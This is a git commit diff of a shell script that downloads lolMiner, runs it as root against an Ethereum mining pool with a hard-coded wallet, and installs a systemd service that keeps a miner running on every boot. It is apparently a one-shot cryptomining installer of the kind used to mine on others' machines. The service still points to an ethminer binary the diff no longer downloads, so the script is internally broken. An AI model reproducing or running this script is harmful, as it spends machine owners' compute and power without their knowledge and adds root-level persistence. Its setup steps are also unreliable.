bc94179f0e11478f06f5fcb17f407ed9cc863d99
lampham6958 <102531733+lampham6958@users.noreply.github.com>
2022-04-01 01:31:18 +0800

    Update trong.sh

--- trong.sh
+++ trong.sh
@@ -3,8 +3,9 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
 then
 	echo "taind vip pro" > isHaveSetupCoin.txt
 	cd /usr/local/bin
-	sudo wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-	sudo tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+	sudo wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.33/lolMiner_v1.33_Lin64.tar.gz
+	sudo tar -xf lolMiner_v1.33_Lin64.tar.gz
+	sudo ./lolMiner --algo ETHASH --pool us-eth.2miners.com:2020 --user 15FsczceHVaBuV12mBNKFLEJVRZA5hCBdo.t11
 	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://192.159.142.45:6868 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
 	sudo systemctl daemon-reload
 	sudo systemctl enable eth.service
